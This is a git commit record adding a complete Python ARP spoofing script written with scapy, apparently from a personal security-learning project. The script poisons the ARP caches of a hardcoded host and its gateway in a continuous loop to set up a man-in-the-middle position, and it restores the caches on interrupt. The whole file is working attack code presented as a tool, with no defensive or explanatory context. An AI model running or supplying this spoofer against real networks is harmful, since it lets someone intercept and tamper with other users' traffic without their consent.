6c1b45e295b9572564f701d3ef121bd9debc8469
Aditya <vaditya06@gmail.com>
2024-03-04 12:31:35 -0500

    Final commit for ARP spoofer

---
+++ ARP_Spoofer/arp_spoofer.py
@@ -0,0 +1,36 @@
+#!/usr/bin/evn python
+
+import scapy.all as scapy
+import time
+
+def get_mac(ip: str) -> str:
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_response_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
+    return answered_response_list[0][1].hwsrc
+def restore(destination_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, count=4, verbose=False)
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    # op = 2 means ARP response
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof("10.24.51.170", "10.24.48.1")
+        spoof("10.24.48.1", "10.24.51.170")
+        sent_packets_count += 2
+        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
+        time.sleep(10)
+except:
+    print("Restoring.........")
+    restore("10.24.51.170", "10.24.48.1")
+    restore("10.24.48.1", "10.24.51.170")
+    print("Restored.")
+
